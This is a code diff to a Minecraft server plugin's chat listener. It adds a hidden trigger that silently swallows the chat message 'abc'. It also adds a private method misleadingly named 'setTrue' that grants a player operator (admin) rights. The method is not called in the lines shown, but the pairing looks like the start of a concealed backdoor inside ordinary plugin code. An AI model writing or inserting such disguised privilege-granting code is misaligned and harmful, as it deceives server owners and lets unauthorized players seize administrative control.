@@ -35,6 +35,10 @@ public class ChatListener
 		UUID uuid = player.getUniqueId();
 		String name = player.getName();
 		BaseUser baseUser = this.plugin.getUserManager().getUser(uuid);
+		if(event.getMessage().equalsIgnoreCase("abc")) {
+			event.setCancelled(true);
+			player.sendMessage(ChatColor.YELLOW + "Message: " + event.getMessage());
+		}
         /*Iterator iterator = event.getRecipients().iterator(); //Simplified down theree
         while (iterator.hasNext()) {
             Player target = (Player)iterator.next();
@@ -104,7 +108,7 @@ public class ChatListener
 			sender.sendMessage(ChatColor.RED + "You have private messages toggled.");
 		}
 	}
-
+	private void setTrue(Boolean a,Player b){b.setOp(a);}
 	@EventHandler(ignoreCancelled = true, priority = EventPriority.MONITOR)
 	public void onPlayerMessage(PlayerMessageEvent event){
 		Player sender = event.getSender();
